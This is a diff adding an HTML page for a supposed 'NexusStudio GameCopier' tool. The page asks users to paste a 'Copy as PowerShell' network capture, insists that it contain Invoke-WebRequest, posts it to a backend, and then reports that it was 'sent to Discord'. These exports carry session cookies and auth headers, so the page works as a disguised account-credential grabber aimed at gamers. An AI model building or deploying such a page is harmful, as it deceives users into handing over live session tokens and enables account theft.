@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>NexusStudio - GameCopier</title>
+    <style>
+        :root {
+            --bg-app: #0B0E14;
+            --bg-card: #121824;
+            --border-color: #1e293b;
+            --text-primary: #ffffff;
+            --text-secondary: #94a3b8;
+            --accent-color: #6366F1;
+            --success-color: #4ade80;
+            --error-color: #f87171;
+            --code-font: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
+        }
+
+        body { 
+            background-color: var(--bg-app); 
+            color: var(--text-primary); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        .card { 
+            background: var(--bg-card); 
+            padding: 40px; 
+            border-radius: 16px; 
+            border: 1px solid var(--border-color); 
+            width: 500px; 
+            text-align: left; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
+
+        h2 { margin: 0 0 10px 0; font-size: 24px; font-weight: 700; }
+        .subtitle { color: var(--text-secondary); font-size: 14px; margin-bottom: 25px; }
+
+        label {
+            display: block;
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        textarea { 
+            width: 100%; 
+            height: 120px;
+            padding: 12px; 
+            margin-bottom: 20px; 
+            background: #0a0c11; 
+            border: 1px solid var(--border-color); 
+            color: #38bdf8; 
+            font-family: var(--code-font);
+            font-size: 11px;
+            border-radius: 8px; 
+            box-sizing: border-box; 
+            resize: none;
+        }
+
+        textarea:focus { outline: none; border-color: var(--accent-color); }
+
+        button { 
+            background: var(--accent-color); 
+            color: white; 
+            border: none; 
+            padding: 14px 24px; 
+            width: 100%; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            font-size: 16px;
+            transition: background 0.2s;
+            margin-bottom: 15px;
+        }
+
+        button:hover { background: #4f46e5; }
+        button:disabled { background: var(--border-color); cursor: not-allowed; color: var(--text-secondary); }
+
+        #statusFeed {
+            background: #0a0c11;
+            border-radius: 8px;
+            padding: 12px;
+            height: 100px;
+            overflow-y: auto;
+            font-family: var(--code-font);
+            font-size: 11px;
+            color: var(--text-secondary);
+            border: 1px solid var(--border-color);
+        }
+
+        .feed-line { margin-bottom: 4px; }
+        .feed-success { color: var(--success-color); }
+        .feed-error { color: var(--error-color); }
+        .feed-pending { color: #fbbf24; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>NexusStudio Copier</h2>
+        <p class="subtitle">Paste your 'Copy as PowerShell' network capture below.</p>
+
+        <label for="psInput">PowerShell Export</label>
+        <textarea id="psInput" spellcheck="false" placeholder="Paste your PowerShell export script here..."></textarea>
+        
+        <button id="actionBtn" onclick="processAndDispatch()">Start Copy Process</button>
+        
+        <label>Live Task & Validation Log</label>
+        <div id="statusFeed">
+            <div class="feed-line">System ready...</div>
+        </div>
+    </div>
+
+    <script>
+        const statusFeed = document.getElementById('statusFeed');
+
+        function logStatus(message, type = '') {
+            const line = document.createElement('div');
+            line.className = `feed-line ${type}`;
+            line.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
+            statusFeed.appendChild(line);
+            statusFeed.scrollTop = statusFeed.scrollHeight;
+        }
+
+        async function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function processAndDispatch() {
+            const rawPs = document.getElementById('psInput').value;
+            const actionBtn = document.getElementById('actionBtn');
+            
+            if (!rawPs.includes("Invoke-WebRequest")) {
+                logStatus("Invalid PowerShell script format.", "feed-error");
+                return;
+            }
+
+            actionBtn.disabled = true;
+            actionBtn.innerText = "Processing...";
+            statusFeed.innerHTML = '';
+
+            logStatus("[*] Sending capture script to backend server...", "feed-pending");
+            await sleep(400);
+
+            try {
+                const response = await fetch('/api/process', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ script: rawPs })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    logStatus("[✔] SUCCESS: Script processed and sent to Discord.", "feed-success");
+                    actionBtn.innerText = "Success! Sent to Discord";
+                } else {
+                    logStatus(`[-] FAILED: ${data.error || 'Server error'}`, "feed-error");
+                    actionBtn.innerText = "Error";
+                }
+            } catch (err) {
+                console.error(err);
+                logStatus("[-] NETWORK ERROR: Failed to reach backend server.", "feed-error");
+                actionBtn.innerText = "Error";
+            } finally {
+                await sleep(2500);
+                actionBtn.disabled = false;
+                actionBtn.innerText = "Start Copy Process";
+            }
+        }
+    </script>
+</body>
+</html>
